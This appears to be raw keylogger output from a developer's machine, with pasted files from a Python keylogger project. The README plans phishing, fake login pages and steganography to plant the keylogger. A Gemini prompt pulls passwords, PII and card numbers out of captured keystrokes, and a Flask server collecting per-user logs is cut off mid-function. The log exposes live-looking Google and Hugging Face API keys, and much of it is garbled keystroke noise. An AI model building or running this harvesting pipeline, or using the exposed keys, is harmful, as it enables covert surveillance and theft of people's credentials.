hi ramaiahKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdKey.cmdlKey.ctrl_rKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_gr/Key.ctrl_rKey.alt_grKey.alt_grKey.leftKey.downKey.leftKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_r<ctrl>Key.alt_grKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_gr<ctrl>Key.alt_grKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.ctrl_rKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.ctrl_rKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_gr<ctrl>Key.alt_grKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_r<alt><alt><alt><alt><alt><alt><alt><alt><alt><alt><alt><alt><ctrl>Key.delete<alt><alt><alt><alt><alt><alt><alt><alt><alt><alt><alt><alt><alt>Key.ctrl_rKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.ctrl_rKey.ctrl_rKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_grKey.alt_gr<ctrl>Key.alt_grKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_r<alt><alt><alt><alt><alt>Key.backspace<ctrl>Key.deleteduck
sfli
wqhKey.backspaceKey.backspacehat if
edaddeaddw<shift>aaaaaaaaaaaaaaswsssssssssssssdawrKey.media_volume_down<shift> aKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downad<shift>ar<shift>D<shift>sad<shift>sdw<shift>wdawrs<shift>ddddddddddddddddddddddddraw<shift>sawda<shift>awa<shift>ssssssssssssssssssssswaasdwwwwwwwwwwasawwwwwwwwwwwdasddwdwawd<shift> <shift> asssawwraaaaaaaaaaaaaaaaaaaaaaawasawawwwwwwwwwwwwwwwwwwwd<shift>r<shift>asssssssssssssssdrdwwwwww<tab><tab>waaaaaaaaaaaaaadwaaa<shift>Waaaaaaaaaaaaaaaaaaaaddrdddddawwwwwwwwwwwwww<shift> d<shift> ddssssssssssssssssaaaaaaaaaaddddddddddddwddddddddddra<shift> wasssssssssssdwwwra<shift>awdd<shift>ddr<tab>sadddddddddddddddddww<tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab>wd<shift>daswwwwwddddddddddddddddsddddddddddddddwa<shift>Wswwwwwwwwwwwww<shift>As<shift>dwaaaaaaaaaaaaaaaaw<shift>s<shift>dssssssssssss<shift>Aw<shift>dwwwwsawddddddddddddasadwwwwasddrdwaw<shift>ddra<shift>daw<shift>wwdddddddwaaaaaaaaaaaadaddddddr<tab><tab><tab>aaaaaaaaaaaaaaaddddddddddddddddaaaaaaaaaadwraddddd<tab>awddddddddaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadwr<tab>sdawddddddddddddddddddddddddddaaaaaaaaaaaaaaaaaaw<shift>aasaaa<shift>swwwwwwwwwwwwwwwwwr<shift>swswd<shift><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab>w<shift>D dddddddddawwwwwwwwwwwwwwwwwsdrdw<shift>da<tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab>wwwwwwwwd<shift> addddddddddddddddd<shift> <shift> asaaw<shift>Sdwdasdwa<shift><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab>waw<shift> aaaaaaaaaaaaaaaaasddddadddddddddddddddddda<tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab>w<shift> dddadwddddddddddddddddddddaswrddwwwwwwwwwasssssssssssssssssawdw<shift>wwwwwwwwwwww<shift>daaaaaaaaaaaadwra<shift>Wwwwwwdddddddddddddddddddddddddawrdw<shift> daaaaaaaaaadaaaaaaaaaaaaaaaddddddddawr<shift> adw<shift> awwaswwwwwwwwwdrdsaw<shift>s<tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab><tab>wwwwwwwwwwwwwwwwddddddawsdwwwwwwwwwwwwwawwwdasrdwadddawsssssdwsawdaaaaaawwwwrds<shift>waaaaaaaaadwawsawdw<tab>d<shift>aaaawwwwwwwwadsawwwwwwwwwwwwwwwwwwwwdwaaaawdwrdddddddddddddddwaaaaaaaaaaaaaaaaaaawddwawads<shift>rawdaaaaadwadddddddddddaaaaaaaaadddddd<tab><tab><tab><tab><tab><tab><tab><tab><tab><tab>Key.esc[Clipboard] hf_UHKxZAGGbJSNqnuhhSbkMAPCAEEuIFcIlPwhat is the most sphistaceKey.backspaceted source of viewing imprant means ofKey.backspacer methids of accessing personal ifKey.backspacenformation onto everyones devices so tha we could eaily or potentialy pitgKey.backspaceflag it in the fworst way possible 8-8-8Key.backspaceKey.backspaceKey.backspaceKey.backspace080
<ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><191><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><191><ctrl>\x13<ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl>[Clipboard] https://ssd84hck-8080.inc1.devtunnels.ms/divithif oKey.backspaceyou are working on the chatbot htKey.backspaceKey.backspacething and need soeKey.backspaceme help or something ...[Clipboard] <ctrl><ctrl><ctrl><ctrl><ctrl><ctrl>shKey.backspaceKey.backspaceKey.esc<ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl>\x12<alt><tab><alt><tab>
-Key.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspace- <shift>WebiKey.backspacesite linkKey.backspaceks Key.backspace
Key.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspace<ctrl>\x13<alt><alt><tab><alt><tab><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl>\x03[Clipboard] https://www.canva.com/design/DAGaly3zfJI/ZB1HiIJ4iWl4g3RbOxYbMA/edit?referrer=icons-landing-page<alt><tab><ctrl>\x12now leaving everything can you from the intial code when it analyzes keystrokes also analyze it and produce the text in the backend in the markdonw fromatKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceormat or somthKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceso that we see the analyzed part in theKey.backspaceKey.backspaceKey.backspacea marksKey.backspacedown format in the format , dont change in the Key.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspacee anything in the code , first tell what are teh requiremetnKey.backspaceents and how are you going to implemtnKey.backspaceKey.backspaceent<tab><tab><tab><tab><tab><tab>
<alt><tab>like add another option along withtKey.backspace analyze <alt><tab><alt><tab><tab><alt><tab><shift>Logs iption<ctrl>\x1a\x1a<alt><tab><tab>pKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspace or better besides analyze logs button besides Key.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceif text i Key.backspaces present in the <alt><tab><alt><tab><tab><ctrl>\x01Key.delete<alt><tab><alt><tab><tab>generated output text area ok <shift>??<alt><tab><alt><tab>, do the saKey.backspaceKey.backspacereuKey.backspacequirements and next steps again <alt><tab><alt><tab>or uptKey.backspacedate your previous respondKey.backspacese only adding or enchancing or updating it , i will give you my code next so we can proceed from there with my perminKey.backspacession
<alt><tab>./sh<tab>Key.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspacecd k<tab><tab>Key.backspace<shift>K<tab>
cd <shift>Py<tab>\\ c<tab>\\ 2/
ls
./sh<tab>
<ctrl>\x01\x03<alt>[Clipboard] File: /mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/README.md , the code for this file is : 
# Keylogger and Keylogger Detector

## Overview
This project implements a basic keylogger and a keylogger detector. The aim is to demonstrate how keyloggers can be built and infiltrated into systems using various techniques, as well as how they can be detected and removed.

## Objectives
1. Build a basic keylogger.
2. Infiltrate the keylogger into a system using malicious emails, phishing, and steganography techniques.
3. Detect and remove the keylogger from the infected system.

## Steps

### 1. Building the Keylogger
- Implement the keylogger using Python and the `pynput` library.
- Package the keylogger as a standalone executable using PyInstaller.
- Ensure the keylogger can run silently in the background, logging keystrokes to a file.

### 2. Infiltrating the Keylogger
- **Malicious Emails**: Craft convincing phishing emails to trick users into running the keylogger executable.
- **Phishing**: Create fake login pages or attachments that deliver the keylogger when interacted with.
- **Steganography**: Hide the keylogger executable within innocuous-looking files (e.g., images or documents) to evade detection.

### 3. Detecting and Removing the Keylogger
- **Monitoring System Processes**: Identify and analyze unfamiliar or suspicious processes running in the background.
- **File System Monitoring**: Look for unexpected files or changes in system directories.
- **Registry and Startup Item Checks**: Inspect the registry and startup items for suspicious entries (Windows).
- **Network Traffic Analysis**: Check for unusual network activity that might indicate keylogger data being sent out.
- **Removal**: Terminate the keylogger process and delete associated files and registry entries.

## Getting Started
### Prerequisites
- Python 3.x
- `pynput` library
- PyInstaller



File: /mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/flask-server/ai_analysis.py , the code for this file is : 
# # # ai_analysis.py

# # import google.generativeai as genai

# # # Replace 'your-google-api-key' with your actual Google Gemini API key
# # GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
# # genai.configure(api_key=GOOGLE_API_KEY)

# # def analyze_keystrokes(keystrokes):
# #     try:
# #         model = genai.GenerativeModel('gemini-1.5-flash')
# #         response = model.generate_content(f"Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed:\n\n{keystrokes}")
# #         crucial_info = response.text.strip()
# #         return crucial_info
# #     except Exception as e:
# #         error_message = f"Error during AI analysis: {e}"
# #         print(error_message)
# #         return error_message  # Return the detailed error message for debugging

# # # Example usage
# # if __name__ == "__main__":
# #     sample_keystrokes = "Hello world! This is a test of the AI analysis."
# #     print(analyze_keystrokes(sample_keystrokes))


# #Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys



# # ai_analysis.py

# import google.generativeai as genai

# # Replace 'your-google-api-key' with your actual Google Gemini API key
# GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
# genai.configure(api_key=GOOGLE_API_KEY)

# def analyze_keystrokes(keystrokes):
#     try:
#         model = genai.GenerativeModel('gemini-1.5-flash')
#         response = model.generate_content(f"""Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys:\n\n{keystrokes}""")
#         crucial_info = response.text.strip()
#         return crucial_info
#     except Exception as e:
#         error_message = f"Error during AI analysis: {e}"
#         print(error_message)
#         return error_message  # Return the detailed error message for debugging

# # Example usage
# if __name__ == "__main__":
#     sample_keystrokes = "Hello world! This is a test of the AI analysis."
#     print(analyze_keystrokes(sample_keystrokes))



# # # ai_analysis.py

# # import google.generativeai as genai

# # # Replace 'your-google-api-key' with your actual Google Gemini API key
# # GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
# # genai.configure(api_key=GOOGLE_API_KEY)

# # def analyze_keystrokes(keystrokes):
# #     try:
# #         model = genai.GenerativeModel('gemini-1.5-flash')
# #         response = model.generate_content(f"Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed:\n\n{keystrokes}")
# #         crucial_info = response.text.strip()
# #         return crucial_info
# #     except Exception as e:
# #         error_message = f"Error during AI analysis: {e}"
# #         print(error_message)
# #         return error_message  # Return the detailed error message for debugging

# # # Example usage
# # if __name__ == "__main__":
# #     sample_keystrokes = "Hello world! This is a test of the AI analysis."
# #     print(analyze_keystrokes(sample_keystrokes))


# #Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys



# THIS IS USING GOOGLE
# ai_analysis.py

import google.generativeai as genai

# Replace 'your-google-api-key' with your actual Google Gemini API key
GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
genai.configure(api_key=GOOGLE_API_KEY)

def analyze_keystrokes(keystrokes):
    try:
        model = genai.GenerativeModel('gemini-1.5-flash')
        response = model.generate_content(f"""
    Analyze the following keystroke log for sensitive information and interpret the typing process to simulate the final intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys.

    In addition, highlight and extract sensitive information, including but not limited to:
    - Passwords
    - Personal Identification Information (PII) such as names, addresses, phone numbers, social security numbers, etc.
    - Credit card numbers
    - Confidential notes and messages
    - Code snippets that might contain API keys or secrets
    - Website links
    - Any form of login credentials or security phrases

    Display code or software-related patterns distinctly for clarity.

    This prompt instructs the AI to:
    1. Interpret the keystroke log to simulate typing.
    2. Handle caps lock and shift key states to manage capitalization.
    3. Filter out non-printing keystrokes.
    4. Highlight and extract sensitive information accurately, minimizing false positives.
    5. Display code or software-related patterns separately for clarity.

    Keystroke Log:
    {keystrokes}
    """)
        crucial_info = response.text.strip()
        return crucial_info
    except Exception as e:
        error_message = f"Error during AI analysis: {e}"
        print(error_message)
        return error_message  # Return the detailed error message for debugging

# Example usage
if __name__ == "__main__":
    sample_keystrokes = "Hello world! This is a test of the AI analysis."
    print(analyze_keystrokes(sample_keystrokes))










#     # ai_analysis.py

# import requests

# # Replace 'your-huggingface-api-token' with your actual Hugging Face API token
# HUGGINGFACE_API_TOKEN = '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'
# MODEL_NAME = 'Qwen/Qwen2.5-Coder-32B-Instruct'
# API_URL = f'https://api-inference.huggingface.co/models/{MODEL_NAME}'

# headers = {
#     "Authorization": f"Bearer {HUGGINGFACE_API_TOKEN}"
# }

# def analyze_keystrokes(keystrokes):
#     try:
#         prompt = f"""
# Analyze the following keystroke log for sensitive information and interpret the typing process to simulate the final intended text. Ensure correct handling of capitalization: recognize when caps lock is toggled on/off and when shift is held down to capitalize letters. Disregard all non-printing keystrokes, including backspace, arrow keys, modifier keys, and function keys.

# In addition, highlight and extract sensitive information, including but not limited to:
# - Passwords
# - Personal Identification Information (PII) such as names, addresses, phone numbers, social security numbers, etc.
# - Credit card numbers
# - Confidential notes and messages
# - Code snippets that might contain API keys or secrets
# - Any form of login credentials or security phrases

# Display code or software-related patterns distinctly for clarity.

# This prompt instructs the AI to:
# 1. Interpret the keystroke log to simulate typing.
# 2. Handle caps lock and shift key states to manage capitalization.
# 3. Filter out non-printing keystrokes.
# 4. Highlight and extract sensitive information accurately, minimizing false positives.
# 5. Display code or software-related patterns separately for clarity.

# Keystroke Log:
# {keystrokes}
# """

#         payload = {
#             "inputs": prompt,
#             "options": {
#                 "use_cache": False
#             }
#         }

#         response = requests.post(API_URL, headers=headers, json=payload)

#         if response.status_code == 200:
#             result = response.json()
#             # Depending on the model and API, the response structure might vary
#             # Typically, Hugging Face returns a list of generated texts
#             if isinstance(result, list) and 'generated_text' in result[0]:
#                 crucial_info = result[0]['generated_text'].strip()
#                 return crucial_info
#             elif isinstance(result, dict) and 'error' in result:
#                 return f"Error from model: {result['error']}"
#             else:
#                 # Fallback if the response structure is different
#                 return str(result).strip()
#         else:
#             return f"Request failed with status code {response.status_code}: {response.text}"

#     except Exception as e:
#         error_message = f"Error during AI analysis: {e}"
#         print(error_message)
#         return error_message  # Return the detailed error message for debugging

# # Example usage
# if __name__ == "__main__":
#     sample_keystrokes = "Hello world! This is a test of the AI analysis."
#     print(analyze_keystrokes(sample_keystrokes))


File: /mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/flask-server/server.py , the code for this file is : 
# # server.py

# from flask import Flask, request, jsonify, render_template, Response
# import threading
# import time
# import os
# from ai_analysis import analyze_keystrokes  # Import the AI analysis function
# import google.generativeai as genai

# app = Flask(__name__)

# GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
# genai.configure(api_key=GOOGLE_API_KEY) #INPUT : Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed

# logs_dir = "user_logs/"  # Directory to store user logs

# if not os.path.exists(logs_dir):
#     os.makedirs(logs_dir)

# logged_keys = {}
# live_keys = {}

# def get_user_log_file(username):
#     return os.path.join(logs_dir, f"{username}_keylog.txt")

# @app.route('/')
# def index():
#     return render_template('index.html')

# @app.route('/log', methods=['POST'])
# def log():
#     data = request.json
